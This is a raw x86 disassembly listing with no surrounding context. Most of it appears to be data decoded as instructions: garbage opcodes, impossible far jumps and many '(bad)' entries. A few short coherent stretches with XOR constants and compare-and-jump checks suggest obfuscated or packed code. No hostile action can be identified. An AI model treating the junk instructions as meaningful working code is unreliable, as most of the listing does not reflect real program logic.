  416256:	mov    BYTE PTR [edx],cl
  416258:	aam    0xda
  41625a:	mov    edi,0xec6a511e
  41625f:	cs aaa 
  416261:	or     edx,DWORD PTR [eax+0x3a]
  416264:	pop    esp
  416265:	push   ebp
  416266:	pop    ebp
  416267:	lahf   
  416268:	sti    
  416269:	pop    DWORD PTR [ebx]
  41626b:	ins    BYTE PTR es:[edi],dx
  41626c:	pop    ebx
  41626d:	cmp    al,0x27
  41626f:	mov    al,0x1a
  416271:	cs jmp 0x28d:0xd7785688
  416279:	sbb    DWORD PTR [esi+0x1c],ebx
  41627c:	and    DWORD PTR [edi+0x45258fb3],eax
  416282:	and    edx,DWORD PTR [esi]
  416284:	lds    edi,FWORD PTR ds:0x32aedf4d
  41628a:	sub    al,0x94
  41628c:	mov    al,0x79
  41628e:	jecxz  0x4162dd
  416290:	repz pop edi
  416292:	xchg   BYTE PTR cs:[ebp+0x19],ch
  416296:	sub    DWORD PTR [edi+0x24],0x7419b04b
  41629d:	add    esp,esp
  41629f:	sbb    DWORD PTR [edx-0x83b0ea7],ebp
  4162a5:	fmulp  st(5),st
  4162a7:	cdq    
  4162a8:	jo     0x4162f8
  4162aa:	daa    
  4162ab:	xchg   edx,eax
  4162ac:	daa    
  4162ad:	pop    es
  4162ae:	cs add al,0x47
  4162b1:	sbb    al,0xdd
  4162b3:	frstor [ebp+0x72]
  4162b6:	test   DWORD PTR [eax-0x629ce285],edi
  4162bc:	je     0x4162d7
  4162be:	adc    eax,0x4bb8598b
  4162c3:	pop    edx
  4162c4:	stc    
  4162c5:	neg    BYTE PTR [edi]
  4162c7:	imul   eax,edx,0x67
  4162ca:	test   al,0x9c
  4162cc:	mov    dl,0x52
  4162ce:	jb     0x41630a
  4162d0:	xor    al,0x10
  4162d2:	mov    ah,0x5d
  4162d4:	jmp    0x1886fa24
  4162d9:	neg    DWORD PTR [eax+0x5f]
  4162dc:	and    al,0xde
  4162de:	push   ebp
  4162df:	out    dx,al
  4162e0:	stos   DWORD PTR es:[edi],eax
  4162e1:	out    dx,al
  4162e2:	out    0x46,al
  4162e4:	out    0x37,al
  4162e6:	adc    ebp,esi
  4162e8:	aas    
  4162e9:	jmp    0xfa28:0xc710debe
  4162f0:	ds jmp 0xfd0cf3cc
  4162f6:	rcl    BYTE PTR [ecx+0x7bc71d86],cl
  4162fc:	cld    
  4162fd:	or     ch,dh
  4162ff:	jno    0x416376
  416301:	jo     0x416287
  416303:	sbb    BYTE PTR [eax+edx*8],cl
  416306:	js     0x416372
  416308:	and    dl,0x3d
  41630b:	pop    edx
  41630c:	dec    ebx
  41630d:	push   ds
  41630e:	enter  0xc50b,0x99
  416312:	lods   al,BYTE PTR ds:[esi]
  416313:	js     0x416310
  416315:	cmp    ebp,DWORD PTR fs:[ebp+0x23477d0]
  41631c:	push   edx
  41631d:	and    DWORD PTR [esi+0x1d],esi
  416320:	pop    ebp
  416321:	mov    ebp,0x1f0079c1
  416326:	pop    ds
  416327:	add    eax,0xf9a18c72
  41632c:	jbe    0x4162cf
  41632e:	adc    eax,0x1ec49641
  416333:	hlt    
  416334:	xor    ah,dl
  416336:	push   ds
  416337:	mov    cl,BYTE PTR [edx]
  416339:	mov    ecx,DWORD PTR [ebx]
  41633b:	mov    DWORD PTR [ebp+0x14],edi
  41633e:	mov    edi,DWORD PTR [ebx+0x4]
  416341:	xor    ecx,0xba699573
  416347:	xor    edi,0x9c0a89d8
  41634d:	shrd   ecx,edi,0x2
  416351:	or     ecx,DWORD PTR [ebp+0x10]
  416354:	shr    edi,0x2
  416357:	mov    DWORD PTR [ebp-0x70],ecx
  41635a:	mov    ecx,edi
  41635c:	or     ecx,DWORD PTR [ebp+0x14]
  41635f:	mov    DWORD PTR [ebp+0xc],edi
  416362:	cmp    edx,DWORD PTR [ebp-0x70]
  416365:	jne    0x41a17f
  41636b:	cmp    DWORD PTR [ebp-0x64],ecx
  41636e:	jne    0x41a17f
  416374:	jmp    0x41854e
  416379:	mov    eax,DWORD PTR [esi]
  41637b:	mov    edx,DWORD PTR [esi+0x4]
  41637e:	mov    eax,DWORD PTR [esi]
  416380:	mov    edx,DWORD PTR [esi+0x4]
  416383:	jmp    0x41690d
  416388:	and    DWORD PTR [ecx-0x37],ebp
  41638b:	mov    esp,0x68181cb9
  416390:	loopne 0x4163ad
  416392:	lods   al,BYTE PTR ds:[esi]
  416393:	scas   al,BYTE PTR es:[edi]
  416394:	push   ebx
  416395:	pop    ds
  416396:	adc    al,0xa8
  416398:	dec    ebp
  416399:	scas   eax,DWORD PTR es:[edi]
  41639a:	or     al,0x16
  41639c:	cmp    eax,0x48161604
  4163a1:	cmp    eax,esi
  4163a3:	pop    ds
  4163a4:	sub    al,0x40
  4163a6:	je     0x416371
  4163a8:	pop    es
  4163a9:	and    eax,edx
  4163ab:	cs dec esp
  4163ad:	mov    esp,0xf6cb5eef
  4163b2:	xchg   edi,eax
  4163b3:	fwait
  4163b4:	mov    ch,0xff
  4163b6:	push   ss
  4163b7:	inc    edi
  4163b8:	sub    BYTE PTR [ebp+eiz*1-0xd544187],ah
  4163bf:	scas   eax,DWORD PTR es:[edi]
  4163c0:	dec    edx
  4163c1:	(bad)  
  4163c2:	in     eax,0x35
  4163c4:	pop    es
  4163c5:	aas    
  4163c6:	lods   al,BYTE PTR ds:[esi]
  4163c7:	sbb    dh,dl
  4163c9:	adc    BYTE PTR [ebp-0x26],0x2b
  4163cd:	jmp    0x556c:0x409723e8
  4163d4:	cmc    
  4163d5:	mov    eax,0x7837bae0
  4163da:	aas    
  4163db:	and    bh,dl
  4163dd:	mov    BYTE PTR [eax+0x4a1a48b0],bl
  4163e3:	pop    esi
  4163e4:	test   al,0xf4
  4163e6:	mov    edx,0x72c70d2b
  4163eb:	out    dx,al
  4163ec:	sub    eax,0x370264e8
  4163f1:	push   cs
  4163f2:	out    0x3a,eax
  4163f4:	cmp    al,0xce
  4163f6:	nop
  4163f7:	sti    
  4163f8:	dec    ebx
  4163f9:	sbb    eax,0x199b4ce0
  4163fe:	fist   WORD PTR [edi]
  416400:	pop    ebp
  416401:	(bad)  
  416402:	cmp    BYTE PTR [eax+0x6ed87368],al
  416408:	or     ah,cl
  41640a:	pop    edi
  41640b:	shr    BYTE PTR [ebx],cl
  41640d:	push   es
  41640e:	aas    
  41640f:	push   0x16aaa632
  416414:	mov    ebp,0x38183ac1
  416419:	jecxz  0x4163d1
  41641b:	add    BYTE PTR [edi+ebx*8+0x33],dh
  41641f:	xchg   DWORD PTR [ecx],ecx
  416421:	sub    al,0x5c
  416423:	cmp    BYTE PTR [edx-0x8],ch
  416426:	inc    esi
  416427:	mov    al,0x49
  416429:	dec    esp
  41642a:	xor    BYTE PTR [eax-0x6],ch
  41642d:	mov    ch,0x67
  41642f:	in     al,0xec
  416431:	repz mov edx,0x49a40400
  416437:	sub    al,0xab
  416439:	mov    dh,0x5c
  41643b:	in     eax,0xa6
  41643d:	repnz aaa 
  41643f:	or     ebp,DWORD PTR [edi+edx*8]
  416442:	xor    edx,DWORD PTR [esi+0x2e36700e]
  416448:	js     0x416493
  41644a:	cmp    al,0xe1
  41644c:	adc    BYTE PTR [eax],0x61
  41644f:	xchg   DWORD PTR [ebx+0x7aead2ff],esp
  416455:	inc    ecx
  416456:	fwait
  416457:	mov    edi,0x322d2fb6
  41645c:	std    
  41645d:	jmp    0x4164d6
  41645f:	repz adc ebp,DWORD PTR [esi+eiz*1+0x2e67649]
  416467:	lods   al,BYTE PTR ds:[esi]
  416468:	or     al,0x83
  41646a:	ficomp DWORD PTR [edi+0x18]
  41646d:	pop    es
  41646e:	ins    DWORD PTR es:[edi],dx
  41646f:	in     al,dx
  416470:	bt     DWORD PTR [esi-0x38ca8025],ecx
  416477:	push   cs
  416478:	and    esp,eax
  41647a:	dec    edi
  41647b:	aad    0xb3
  41647d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41647e:	jb     0x416496
  416480:	mov    bh,0xf3
  416482:	push   edi
  416483:	(bad)  
  416484:	aad    0x2b
  416486:	sar    DWORD PTR [esi],1
  416488:	or     al,0xba
  41648a:	or     BYTE PTR [edx-0x63],0x6a
  41648e:	and    al,0x14
  416490:	test   al,0xcc
  416492:	ins    DWORD PTR es:[edi],dx
  416493:	shl    DWORD PTR [ebx-0x1e667dc7],cl
  416499:	mov    eax,DWORD PTR [edx-0x13ea27e8]
  41649f:	jg     0x4164f5
  4164a1:	mov    al,ds:0x1b4e9ba0
  4164a6:	push   cs
  4164a7:	inc    esi
  4164a8:	jle    0x416507
  4164aa:	cs call 0x199a28b0
  4164b0:	es sbb al,0xa7
  4164b3:	jp     0x4164e1
  4164b5:	inc    esi
  4164b6:	lock jmp 0x78c1:0x24f6b838
  4164be:	fs mov ah,0x10
  4164c1:	push   edx
  4164c2:	popf   
  4164c3:	icebp  
  4164c4:	xchg   esp,eax
  4164c5:	xchg   esi,eax
  4164c6:	dec    edx
  4164c7:	fst    DWORD PTR [eax]
  4164c9:	int3   
  4164ca:	popa   
  4164cb:	xchg   ecx,eax
  4164cc:	mov    ds:0x4e0df6b,al
  4164d1:	ss add esi,ebx
  4164d4:	repnz mov dl,0xe9
  4164d7:	dec    esi
  4164d8:	mov    al,0xe3
  4164da:	aam    0x8b
  4164dc:	rol    BYTE PTR [ebp-0x76],1
  4164df:	clc    
  4164e0:	mov    dl,0x7f
  4164e2:	out    0x1d,al
  4164e4:	mov    ecx,0x3bc7aafc
  4164e9:	mov    al,ds:0x5b84475
  4164ee:	test   al,0xbb
  4164f1:	add    cl,BYTE PTR [ecx+0x7495c4cc]
  4164f7:	cmc    
  4164f8:	out    dx,eax
  4164f9:	lods   eax,DWORD PTR ds:[esi]
  4164fa:	outs   dx,BYTE PTR ds:[esi]
  4164fb:	xchg   ebx,eax
  4164fc:	push   0x38
  4164fe:	fmul   QWORD PTR [esp+ecx*4-0x46]
  416502:	push   esi
  416503:	enter  0x2eb,0xaa
  416507:	sbb    ecx,DWORD PTR [edi]
  416509:	push   cs
  41650a:	in     al,dx
  41650b:	pop    ebx
  41650c:	mov    eax,0xc723953d
  416511:	ins    BYTE PTR es:[edi],dx
  416512:	fiadd  DWORD PTR [ebp-0x7c9da062]
  416518:	jno    0x416531
  41651a:	push   edx
  41651b:	mov    dh,0x5
  41651d:	xchg   edx,eax
  41651e:	bound  edi,QWORD PTR [ecx+0x681a5d60]
  416524:	and    eax,0x848eff5e
  416529:	jno    0x416517
  41652b:	setbe  bl
  41652e:	xor    DWORD PTR [ebx+eax*4+0x48],0xf644c269
  416536:	jb     0x41654f
  416538:	sub    al,0x18
  41653a:	jbe    0x416554
  41653c:	sub    WORD PTR [ecx+0x28],dx
  416540:	mov    ch,dl
  416542:	and    cl,BYTE PTR [ecx]
  416544:	pop    ecx
  416545:	dec    ebx
  416546:	xor    DWORD PTR [edx],0x2fca44ba
  41654c:	mov    al,ds:0x1e363aa
  416551:	pop    es
  416552:	aas    
  416553:	push   es
  416554:	ror    DWORD PTR [eax],0xf5
  416557:	pop    ebp
  416558:	add    dh,BYTE PTR [ecx+0x3]
  41655b:	ss aas 
  41655d:	jge    0x41658e
  41655f:	imul   edi,DWORD PTR [edx+esi*1+0x2652f2d7],0x292fa743
  41656a:	add    edi,DWORD PTR [esi-0x21]
  41656d:	or     dh,dh
  41656f:	(bad)  
  416570:	aam    0xbb
  416572:	jl     0x41650f
  416574:	or     DWORD PTR [ecx+0x5875b9fe],eax
  41657a:	pop    ebp
  41657b:	cli    
  41657c:	xor    DWORD PTR [esi-0x12],edi
  41657f:	sti    
  416580:	(bad)  
  416581:	fcmovu st,st(0)
  416583:	sbb    DWORD PTR [edi-0x3607d9d],ecx
  416589:	stos   DWORD PTR es:[edi],eax
  41658a:	aaa    
  41658b:	pop    edx
  41658c:	or     eax,DWORD PTR [ecx+edi*2-0x333bb32e]
  416593:	mov    bh,0x5f
  416595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416596:	add    cl,BYTE PTR [edi]
  416598:	imul   edx,DWORD PTR [edx-0x4ffe233],0xffffffb9
  41659f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a0:	(bad)  
  4165a1:	jmp    0x39f8:0x53d74546
  4165a8:	mov    ecx,0x2cb082cb
  4165ad:	cmp    BYTE PTR [eax+0x4bf63262],ch
  4165b3:	mov    ds:0x69d317b6,eax
  4165b8:	mov    WORD PTR [ebp-0x1124aacc],fs
  4165be:	xchg   esp,eax
  4165bf:	push   ds
  4165c0:	loop   0x4165f1
  4165c2:	loopne 0x41663c
  4165c4:	add    edx,DWORD PTR [edx-0xd]
  4165c7:	mov    esi,0x86d6aaa
  4165cc:	iret   
  4165cd:	dec    ecx
  4165ce:	mov    ds:0xd3bd183b,al
  4165d3:	and    al,0x4a
  4165d5:	sub    BYTE PTR [edx-0x1a076ba9],0x13
  4165dc:	mov    eax,0xe2857e33
  4165e1:	in     al,dx
  4165e2:	fisub  WORD PTR [edx]
  4165e4:	in     al,dx
  4165e5:	or     DWORD PTR [esi-0x5f],ecx
  4165e8:	sub    al,0x8c
  4165ea:	leave  
  4165eb:	test   BYTE PTR [ebx],cl
  4165ed:	les    esi,FWORD PTR [eax+0x1d]
  4165f0:	pop    eax
  4165f1:	and    bl,al
  4165f3:	dec    ecx
  4165f4:	or     bl,BYTE PTR ds:0x3fc4c5fb
  4165fa:	fdiv   st(6),st
  4165fc:	into   
  4165fd:	dec    esi
  4165fe:	arpl   WORD PTR [ebp+0x1c],ax
  416601:	jmp    0x839a:0x6f424702
  416608:	xchg   esi,eax
  416609:	sbb    al,BYTE PTR [esi-0x20]
  41660c:	dec    edx
  41660d:	pop    edx
  41660e:	jge    0x41665e
  416610:	sbb    al,0x4a
  416612:	jns    0x41661a
  416614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416615:	sub    BYTE PTR [ecx-0x1ab04fb8],0x3
  41661c:	xor    eax,0x3287abd0
  416621:	call   0xd75f:0x8ed2f395
  416628:	jnp    0x41669a
  41662a:	outs   dx,DWORD PTR ds:[esi]
  41662b:	pop    edi
  41662c:	aad    0x3c
  41662e:	lea    esp,[edx+esi*8-0x66]
  416632:	pop    ecx
  416633:	push   esp
  416634:	nop
  416635:	hlt    
  416636:	adc    ecx,ebp
  416638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416639:	adc    eax,DWORD PTR ds:0x79c185b
  41663f:	scas   eax,DWORD PTR es:[edi]
  416640:	(bad)  
  416641:	and    al,0x41
  416643:	adc    esp,edi
  416645:	lods   eax,DWORD PTR ds:[esi]
  416646:	cmp    al,0xd9
  416648:	xor    ecx,DWORD PTR [eax+esi*4-0x7f1ae1dd]
  41664f:	xor    bl,ah
  416651:	mov    ebx,0x4979b863
  416656:	loopne 0x41666d
  416658:	lods   eax,DWORD PTR ds:[esi]
  416659:	mov    ecx,DWORD PTR [eax]
  41665b:	jmp    0xbb2b777f
  416660:	inc    esi
  416661:	mul    DWORD PTR [edi+ebx*1]
  416664:	xor    eax,0xd29c8024
  416669:	sub    eax,0xa36daa19
  41666e:	dec    esi
  41666f:	outs   dx,DWORD PTR ds:[esi]
  416670:	fadd   DWORD PTR [esp+eiz*4+0x343ced3]
  416677:	inc    edi
  416678:	lods   eax,DWORD PTR ds:[esi]
  416679:	jae    0x416687
  41667b:	mov    al,ds:0x195a86c5
  416680:	fiadd  DWORD PTR [eax+0x776da77e]
  416686:	xor    al,0x78
  416688:	push   edi
  416689:	add    dh,BYTE PTR [ebx+esi*2-0x5c]
  41668d:	or     BYTE PTR [edx+0x1a29215b],bh
  416693:	je     0x416644
  416695:	in     al,dx
  416696:	std    
  416697:	xor    al,0xbf
  416699:	sahf   
  41669a:	(bad)  
  41669b:	fsub   st(5),st
  41669d:	out    0x20,eax
  41669f:	xor    edi,ebp
  4166a1:	nop
  4166a2:	mov    dh,0x85
  4166a4:	xor    DWORD PTR ds:0x9b95c4ef,ebp
  4166aa:	mov    ah,0xbb
  4166ac:	fidiv  WORD PTR [esp+ecx*1+0x7c]
  4166b0:	clc    
  4166b1:	mov    edx,0x33c91e6c
  4166b6:	out    0xa0,eax
  4166b8:	popa   
  4166b9:	lods   eax,DWORD PTR ds:[esi]
  4166ba:	inc    ecx
  4166bb:	les    edx,FWORD PTR [ebp+0x4b]
  4166be:	inc    edi
  4166bf:	mov    edi,0x38ef7b02
  4166c4:	and    edx,DWORD PTR [esi+0x334b953a]
  4166ca:	adc    DWORD PTR [edx+0x7c1820f1],edi
  4166d0:	(bad)  
  4166d1:	(bad)  
  4166d2:	(bad)  
  4166d3:	data16 xor ch,dh
  4166d6:	mov    edi,0x8dcb91c4
  4166db:	or     al,0x24
  4166dd:	or     eax,0x67d0a2a3
  4166e2:	mov    ch,BYTE PTR [esi-0x6a379d87]
  4166e8:	mov    ah,0xdb
  4166ea:	push   eax
  4166eb:	pop    edx
  4166ec:	adc    DWORD PTR [eax+ebx*2+0x78257de8],0xb047f40d
  4166f7:	adc    al,0x5a
  4166f9:	sbb    ebp,DWORD PTR [edx-0x3c]
  4166fc:	push   ss
  4166fd:	xchg   edx,eax
  4166fe:	cmp    cl,BYTE PTR [ecx]
  416700:	and    BYTE PTR [ebx],0x8f
  416703:	adc    al,0xaa
  416705:	(bad)  
  416706:	shl    DWORD PTR [ebx-0x3b17b8b0],cl
  41670c:	iret   
  41670d:	cmp    BYTE PTR [ecx],0x3c
  416710:	dec    ebx
  416711:	fdivr  QWORD PTR [esi]
  416713:	in     eax,dx
  416714:	outs   dx,DWORD PTR ds:[esi]
  416715:	sub    DWORD PTR [edi+0x56db9d66],ebx
  41671b:	adc    al,0x85
  41671e:	ss popf 
  416720:	pop    ds
  416721:	mov    WORD PTR [ecx],gs
  416723:	mov    ecx,0xe2436cb
  416728:	sbb    BYTE PTR [eax+ebp*4+0x57],dh
  41672c:	jmp    0xa678:0xfc9bb24a
  416733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416734:	sbb    edx,DWORD PTR [esp+eax*2-0x249d29c8]
  41673b:	int    0xa0
  41673d:	sbb    eax,0xfaab53f1
  416742:	dec    ebp
  416743:	fldcw  WORD PTR [ecx+0x4dc095e9]
  416749:	and    al,0xc9
  41674b:	out    dx,eax
  41674c:	adc    DWORD PTR ds:0x3a68d68d,ebx
  416752:	add    al,0xb4
  416754:	cdq    
  416755:	sub    eax,0xd239217
  41675a:	push   edi
  41675b:	fwait
  41675c:	sbb    al,0x85
  41675e:	outs   dx,DWORD PTR ds:[esi]
  41675f:	pusha  
  416760:	aad    0x81
  416762:	sbb    al,0x29
  416764:	les    esp,FWORD PTR [esi-0x62a8ab27]
  41676a:	jne    0x4167b8
  41676c:	push   0xa20cc201
  416771:	loop   0x4167dc
  416773:	mov    es,WORD PTR [edx+0xd]
  416776:	sti    
  416777:	inc    esp
  416778:	nop
  416779:	imul   ebx,esp,0x7c
  41677c:	xchg   esp,eax
  41677d:	adc    al,0x30
  41677f:	mov    fs,esp
  416781:	icebp  
  416782:	cmp    DWORD PTR [ebx-0xb95aa68],esp
  416788:	jo     0x4167c3
  41678a:	mov    ecx,0x5f0522d3
  41678f:	shl    DWORD PTR [edx-0x3e],cl
  416792:	sub    bh,BYTE PTR [ecx+0x4c9f7aec]
  416798:	(bad)  
  416799:	fistp  DWORD PTR [edi+0x2]
  41679c:	js     0x416781
  41679e:	aas    
  41679f:	pop    ds
  4167a0:	xchg   ebp,eax
  4167a1:	dec    ebp
  4167a2:	push   0xdf10fe00
  4167a7:	(bad)  
  4167a8:	jno    0x4167c1
  4167aa:	test   al,0xbd
  4167ac:	aaa    
  4167ad:	outs   dx,DWORD PTR ds:[esi]
  4167ae:	and    al,0xaf
  4167b0:	out    0x1d,eax
  4167b2:	xor    eax,0x4dbb6a8b
  4167b7:	shr    DWORD PTR [ebx+0x67b91c9e],cl
  4167bd:	xchg   ebp,eax
  4167be:	pop    ebx
  4167bf:	mov    dh,0xbe
  4167c1:	popf   
  4167c2:	lds    ebx,FWORD PTR [ebp-0x4]
  4167c5:	je     0x4167e5
  4167c7:	je     0x41676b
  4167c9:	repnz lea esi,[edx-0x797dd009]
  4167d0:	pop    es
  4167d1:	cmc    
  4167d2:	mov    edx,0x9957e2a7
  4167d7:	adc    eax,0xf318ede7
  4167dc:	jecxz  0x4167a9
  4167de:	outs   dx,DWORD PTR ds:[esi]
  4167df:	jl     0x4167a5
  4167e1:	adc    bl,BYTE PTR [edi]
  4167e3:	inc    DWORD PTR [edx]
  4167e5:	addr16 jge 0x416853
  4167e8:	jmp    0xeec9:0x38d1119c
  4167ef:	test   dh,dh
  4167f1:	cld    
  4167f2:	bound  edx,QWORD PTR [ebx+ecx*2]
  4167f5:	stos   DWORD PTR es:[edi],eax
  4167f6:	inc    ebp
  4167f7:	int3   
  4167f8:	push   edi
  4167f9:	fist   WORD PTR [ecx-0x10b2e602]
  4167ff:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416801:	xchg   ebx,eax
  416802:	xor    eax,0xd4bba6c9
  416807:	pushf  
  416808:	xchg   ecx,eax
  416809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41680a:	xor    al,0x49
  41680c:	push   es
  41680d:	or     eax,0x337409e8
  416812:	mov    ch,ah
  416814:	inc    ebx
  416815:	das    
  416816:	pop    esp
  416817:	push   esp
  416818:	xor    ch,BYTE PTR [ebx-0x61]
  41681b:	adc    DWORD PTR [edi+0x4d],edi
  41681e:	inc    ebx
  41681f:	inc    ecx
  416820:	jb     0x416899
  416822:	mov    cs,WORD PTR [edi-0x11d80768]
  416828:	stos   DWORD PTR es:[edi],eax
  416829:	test   eax,0xbcaab228
  41682e:	and    BYTE PTR [ebx+0x46],cl
  416831:	call   0x2f35:0xdbb091be
  416838:	add    DWORD PTR [ecx+eiz*4+0x59],esi
  41683c:	dec    edi
  41683d:	lea    ecx,[eax]
  41683f:	mov    bl,0xb9
  416841:	xor    eax,0xed2666bd
  416846:	and    al,0xda
  416848:	(bad)  
  416849:	(bad)  
  41684a:	xor    eax,DWORD PTR [ebx+0x47]
  41684d:	ffree  st(2)
  41684f:	cmp    DWORD PTR [ecx],esi
  416851:	dec    ecx
  416852:	into   
  416853:	shr    bh,cl
  416855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416856:	mov    ebx,0x3c44734e
  41685b:	aam    0x85
  41685d:	lods   eax,DWORD PTR ds:[esi]
  41685e:	shl    DWORD PTR [edi],1
  416860:	jg     0x4168b8
  416862:	pop    ss
  416863:	outs   dx,DWORD PTR ds:[esi]
  416864:	cld    
  416865:	jns    0x416848
  416867:	push   esp
  416868:	jge    0x4167eb
  41686a:	imul   ebp,DWORD PTR [ecx-0x1fe48d3b],0x18
  416871:	repz inc esp
  416873:	test   BYTE PTR [edx+0x40d9de39],ah
  416879:	inc    ecx
  41687a:	sti    
  41687b:	xchg   edi,eax
  41687c:	cdq    
  41687d:	jo     0x416859
  41687f:	jle    0x4168da
  416881:	cmp    ebp,esp
  416883:	jns    0x416883
  416885:	(bad)  
  416886:	in     eax,dx
  416887:	sbb    esi,DWORD PTR [ecx-0x1b]
  41688a:	add    al,0x38
  41688c:	shl    dh,1
  41688e:	push   edi
  41688f:	fdivr  DWORD PTR [edi-0x7d418f16]
  416895:	bound  esi,QWORD PTR [esp+edi*4-0x22]
  416899:	sub    esp,0x9
  41689c:	push   ebx
  41689d:	ror    dh,0x15
  4168a0:	or     dh,BYTE PTR [ecx]
  4168a2:	xchg   eax,ecx
  4168a4:	inc    eax
  4168a5:	outs   dx,DWORD PTR ds:[esi]
  4168a6:	push   edx
  4168a7:	hlt    
  4168a8:	push   0x31
  4168aa:	sub    al,0xb6
  4168ac:	sbb    ecx,DWORD PTR [ebp-0x5c24935a]
  4168b2:	outs   dx,BYTE PTR ds:[esi]
  4168b3:	sbb    BYTE PTR [ecx+0x4c],bl
  4168b6:	inc    ebp
  4168b7:	add    eax,DWORD PTR [ebx+edi*2-0x56]
  4168bb:	pop    ss
  4168bc:	retf   
  4168bd:	jl     0x4168d2
  4168bf:	cli    
  4168c0:	test   eax,0x5cfffed4
  4168c5:	fmul   st,st(7)
  4168c7:	int    0x27
  4168c9:	test   eax,0xa05012c3
  4168ce:	fcom   QWORD PTR [esi-0x7d]
  4168d1:	(bad)  
  4168d2:	sbb    bl,BYTE PTR [ecx+ebx*8+0x50]
  4168d6:	jp     0x4168e6
  4168d8:	sbb    DWORD PTR [esi],ebp
  4168da:	fwait
  4168db:	mov    ch,0x53
  4168dd:	je     0x41692a
  4168df:	or     ah,BYTE PTR [eax]
  4168e1:	add    BYTE PTR [esi],ah
  4168e3:	mov    eax,ds:0xfafa5815
  4168e8:	xacquire xchg DWORD PTR ds:0x4eb54839,esi
  4168ef:	or     DWORD PTR [esi-0x550a131c],edx
  4168f5:	sbb    dh,BYTE PTR [esi+0x6c99fa63]
  4168fb:	in     al,0x84
  4168fd:	stos   DWORD PTR es:[edi],eax
  4168fe:	int3   
  4168ff:	loope  0x416950
  416901:	ds ds out dx,al
  416904:	int3   
  416905:	(bad)  
  416906:	pop    eax
  416907:	inc    ebp
  416908:	inc    eax
  416909:	enter  0x501f,0x36
  41690d:	mov    edx,eax
  41690f:	xor    eax,eax
  416911:	shl    edx,0x1e
  416914:	mov    DWORD PTR [ebp+0x10],eax
  416917:	mov    eax,DWORD PTR [esi]
  416919:	xor    edx,0xc0000000
  41691f:	mov    DWORD PTR [ebp+0x14],edx
  416922:	mov    edx,DWORD PTR [esi+0x4]
  416925:	jmp    0x416eaf
  41692a:	or     BYTE PTR [edx+0x20a461f6],ch
  416930:	jns    0x416944
  416932:	stc    
  416933:	repz sbb BYTE PTR [eax+0x682ee5a6],ch
  41693a:	jp     0x4168d9
  41693c:	or     al,0x16
  41693e:	cmp    eax,0x13161604
  416943:	xchg   BYTE PTR [ebx-0x59d946e2],ah
  416949:	jno    0x416926
  41694b:	sbb    bh,BYTE PTR [ebx]
  41694d:	stos   DWORD PTR es:[edi],eax
  41694e:	or     al,0x15
  416950:	jb     0x4168e0
  416952:	test   BYTE PTR [esi],dl
  416954:	xchg   DWORD PTR [ecx+0x3d],ecx
  416957:	push   esp
  416958:	fsubr  DWORD PTR [esi+0xb]
  41695b:	pop    esp
  41695c:	adc    al,0x9e
  41695e:	pop    eax
  41695f:	rol    BYTE PTR [ecx-0x60],0x6b
  416963:	outs   dx,DWORD PTR ds:[esi]
  416964:	mov    eax,0x82efcb90
  416969:	call   0x50ad5737
  41696e:	pop    esp
  41696f:	push   eax
  416970:	loope  0x416910
  416972:	unpcklps xmm5,XMMWORD PTR ds:0x2dd23e4f
  416979:	or     BYTE PTR [ebp-0x48d3da21],cl
  41697f:	jmp    0x3eba1704
  416984:	or     bl,dl
  416986:	push   ss
  416987:	cmp    ebx,DWORD PTR [esi]
  416989:	inc    DWORD PTR [edx]
  41698b:	es pop es
  41698d:	and    al,0xea
  41698f:	push   edx
  416990:	jno    0x4169cf
  416992:	inc    edx
  416993:	out    dx,eax
  416994:	iret   
  416995:	inc    esi
  416996:	push   es
  416997:	add    eax,0x527fa91c
  41699c:	inc    edx
  41699d:	mov    cl,0xc6
  41699f:	out    0xe9,al
  4169a1:	ins    DWORD PTR es:[edi],dx
  4169a2:	push   cs
  4169a3:	aam    0xa8
  4169a5:	jmp    0xcc839d7a
  4169aa:	shr    DWORD PTR [ebx+0x159ef9f5],cl
  4169b0:	in     al,0x73
  4169b2:	sub    eax,0x9d136578
  4169b7:	mov    esp,0x9241cbed
  4169bc:	out    0xe2,al
  4169be:	sbb    DWORD PTR [ecx-0x5cb4fb40],edi
  4169c4:	xlat   BYTE PTR ds:[ebx]
  4169c5:	(bad)  
  4169c7:	jmp    0x416a0c
  4169c9:	mov    eax,0xb7d59e9a
  4169ce:	mov    ah,0xc1
  4169d0:	out    0x54,eax
  4169d2:	sub    eax,edx
  4169d4:	adc    al,BYTE PTR [esi-0x5f9de60]
  4169da:	aam    0x3
  4169dc:	loopne 0x416979
  4169de:	push   0xbd12eb5d
  4169e3:	lea    eax,[eax]
  4169e5:	mov    bl,0xca
  4169e7:	data16 in al,0xfc
  4169ea:	jno    0x416a3c
  4169ec:	sbb    ah,cl
  4169ee:	repz lds edi,FWORD PTR [esi]
  4169f1:	(bad)  
  4169f2:	sub    BYTE PTR [ebp-0x3417369c],bl
  4169f8:	loope  0x41698e
  4169fa:	xchg   esi,eax
  4169fb:	xchg   edi,eax
  4169fc:	push   ebx
  4169fd:	jmp    0x18f5:0xdb624e9e
  416a04:	sbb    eax,0xfffffff8
  416a07:	push   esp
  416a08:	pusha  
  416a09:	int3   
  416a0a:	(bad)  
  416a0b:	mov    ecx,0xed1461df
  416a10:	sub    DWORD PTR [ebp-0x18],esi
  416a13:	nop
  416a14:	outs   dx,BYTE PTR ds:[esi]
  416a15:	daa    
  416a16:	inc    esi
  416a17:	in     al,0x61
  416a19:	retf   
  416a1a:	icebp  
  416a1b:	mov    ds:0xbbd642,al
  416a20:	xchg   ebp,eax
  416a21:	mov    edi,0x2c047ff6
  416a26:	jno    0x4169c3
  416a28:	out    dx,al
  416a29:	pop    edi
  416a2a:	test   BYTE PTR [eax-0x49da00fd],0x27
  416a31:	mov    ds:0x81ae1ec7,al
  416a36:	push   ecx
  416a37:	push   eax
  416a38:	cli    
  416a39:	cli    
  416a3a:	mov    WORD PTR [edx],es
  416a3c:	jae    0x416a24
  416a3e:	fld    QWORD PTR [esi-0x9ea916b]
  416a44:	mov    ah,0xc1
  416a46:	lods   al,BYTE PTR ds:[esi]
  416a47:	into   
  416a48:	sar    BYTE PTR [esi+0x68],1
  416a4b:	jns    0x416a97
  416a4d:	ja     0x416a99
